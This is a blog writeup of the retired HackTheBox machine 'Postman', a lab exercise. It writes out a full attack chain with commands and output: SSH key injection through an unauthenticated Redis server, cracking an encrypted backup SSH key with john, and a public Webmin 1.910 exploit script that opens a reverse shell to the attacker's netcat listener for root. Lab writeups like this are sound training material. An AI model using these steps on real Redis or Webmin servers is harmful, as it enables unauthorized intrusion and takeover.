@@ -1,0 +1,236 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[HackTheBox] Postman Writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I worked on the Postman retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.160 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2."><meta property="og:image" content><meta property="og:title" content="[HackTheBox] Postman Writeup"><meta property="og:description" content="I worked on the Postman retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.160 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2."><meta property="og:type" content="article"><meta property="og:url" content="/posts/18/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-27T01:22:56+09:00"><meta property="article:modified_time" content="2022-05-27T01:22:56+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HackTheBox] Postman Writeup"><meta name=twitter:description content="I worked on the Postman retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.160 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[HackTheBox] Postman Writeup</h1><div class=meta>Posted on May 27, 2022</div></div><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#port-6379>Port 6379</a></li><li><a href=#privilege-escalation-redis---matt>Privilege Escalation <code>redis</code> -> <code>Matt</code></a></li><li><a href=#privilege-escalation-matt---root>Privilege Escalation <code>Matt</code> -> <code>root</code></a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>I worked on the Postman retired machine of HackTheBox, so I will write its writeup.</p><p><img src=/images/posts/18/label.png alt=label></p><h1 id=port-scan>Port Scan</h1><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.160
+PORT      STATE    SERVICE     VERSION
+22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open     http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek&#39;s Personal Website
+2978/tcp  filtered ttc-etap-ds
+5024/tcp  filtered scpi-telnet
+6379/tcp  open     redis       Redis key-value store 4.0.9
+10000/tcp open     http        MiniServ 1.910 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).
+10234/tcp filtered unknown
+16197/tcp filtered unknown
+17660/tcp filtered unknown
+18639/tcp filtered unknown
+19672/tcp filtered unknown
+20191/tcp filtered unknown
+21826/tcp filtered unknown
+23600/tcp filtered unknown
+32589/tcp filtered unknown
+33266/tcp filtered unknown
+36292/tcp filtered unknown
+38260/tcp filtered unknown
+39560/tcp filtered unknown
+44046/tcp filtered unknown
+48085/tcp filtered unknown
+52018/tcp filtered unknown
+52599/tcp filtered unknown
+58086/tcp filtered unknown
+62083/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h1 id=port-6379>Port 6379</h1><p>Investigation using nmap script shows that the redis server is running on port 6379.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap --script redis-info -sV -p 6379 10.10.10.160
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-25 03:11 EDT
+Nmap scan report for 10.10.10.160
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
+|_redis-info: ERROR: Script execution failed (use -d to debug)                                                                                                                 
+                                                                                                                                                                               
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                 
+Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds
+</code></pre><p>Use <a href=https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh>this document</a> as a reference to generate an ssh key and upload your public key using redis.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kali/.ssh/id_rsa
+Your public key has been saved in /home/kali/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:qvkgFt6UC90lBiG6DEBR9ML8PW9GNdB6LdTQ5DG8/ds kali@kali
+The key&#39;s randomart image is:
++---[RSA 3072]----+
+|oo=oo.   ...*+   |
+|..o...    .o.+o  |
+|o  + .o . oo..o  |
+|o. .o+.o ..o.o . |
+|..o +..oS.. .   .|
+| . = . .+       .|
+|  + + .  +      o|
+| . . +  o      .E|
+|    o..          |
++----[SHA256]-----+
+
+kali@kali:~$ (echo -e &#34;\n\n&#34;; cat ~/.ssh/id_rsa.pub; echo -e &#34;\n\n&#34;) &gt; spaced_key.txt
+kali@kali:~$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
+kali@kali:~$ redis-cli -h 10.10.10.160
+10.10.10.160:6379&gt; config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379&gt; config set dbfilename &#34;authorized_keys&#34;
+OK
+10.10.10.160:6379&gt; save
+OK
+</code></pre><p>Once the upload is complete, you will be able to log in as a redis user using the generated private key. Also, Matt exists as a user with a home directory.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh -i ~/.ssh/id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ id
+uid=107(redis) gid=114(redis) groups=114(redis)
+
+redis@Postman:~$ ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Sep 11  2019 .
+drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
+drwxr-xr-x  6 Matt Matt 4096 Sep 11  2019 Matt
+</code></pre><h1 id=privilege-escalation-redis---matt>Privilege Escalation <code>redis</code> -> <code>Matt</code></h1><p>An investigation using the <a href=https://linpeas.sh/>linpeas script</a> reveals that Matt&rsquo;s backup key is stored.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>redis@Postman:~$ /tmp/linpeas.sh
+...
+[+] Backup files
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
+...
+
+redis@Postman:~$ cat /opt/id_rsa.bak
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+</code></pre><p>Since the ssh key has a password, the password is decrypted locally using john. You can see that the password is <code>computer2008</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ echo &#34;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP                                                                                                               
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY                                                                                                               
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK                                                                                                               
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS                                                                                                               
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke                                                                                                               
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6                                                                                                               
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge                                                                                                               
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----&#34; &gt; id_rsa
+kali@kali:~$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+kali@kali:~$ python3 ssh2john.py id_rsa &gt; id_rsa.hash
+kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa)
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:09 DONE (2022-05-26 02:02) 0.1005g/s 1441Kp/s 1441Kc/s 1441KC/sa6_123..*7¡Vamos!
+Session completed
+</code></pre><p>I tried to log in as Matt using ssh, but I can&rsquo;t.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ chmod 400 id_rsa
+kali@kali:~$ ssh -i id_rsa Matt@10.10.10.160
+Enter passphrase for key &#39;id_rsa&#39;: computer2008 
+Connection closed by 10.10.10.160 port 22
+</code></pre><p>However, when I tried to switch to Matt with <code>su</code>, it succeeded.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>redis@Postman:~$ su Matt
+Password: computer2008 
+Matt@Postman:/var/lib/redis$ id
+uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
+Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
+*************************
+</code></pre><h1 id=privilege-escalation-matt---root>Privilege Escalation <code>Matt</code> -> <code>root</code></h1><p>Initial research revealed that MiniServ 1.910 was running on Port 10000. And that process is running with root privileges. If this version of MiniServ is vulnerable, it could be used to gain root privileges.</p><p>searchsploit reveals that this version is still vulnerable.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ searchsploit Webmin 1.910
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution (Metasploit)                                                                       | linux/remote/46984.rb
+Webmin &lt; 1.920 - &#39;rpc.cgi&#39; Remote Code Execution (Metasploit)                                                                                | linux/webapps/47330.rb
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Do a reverse shell using <a href=https://github.com/roughiz/Webmin-1.910-Exploit-Script>this exploit</a>. Use Matt&rsquo;s credentials to execute the exploit</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ python2 webmin_exploit.py --rhost 10.10.10.160 --lhost 10.10.14.3 --lport 4444 -u Matt -p computer2008 -s True
+****************************** Webmin 1.910 Exploit By roughiz*******************************
+*********************************************************************************************
+*********************************************************************************************
+*********************************************************************************************
+****************************** Retrieve Cookies sid *****************************************
+
+
+********** [+] [Exploit] The Cookie is 8f845e09ac601e0605b1fc665cff081a
+
+********************************************************************************************
+****************************** Create payload and Exploit ***********************************
+
+
+
+
+********** [+] [Exploit] Verify you nc listener on port 4444 for the incomming reverse shell
+</code></pre><p>The reverse shell was successful and I was able to gain root privileges.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.160] 50244
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+*************************
+</code></pre><h1 id=thoughts>Thoughts</h1><p>It was relatively easy, but it was a great machine to learn the chain of attacks.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hackthebox>hackthebox</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
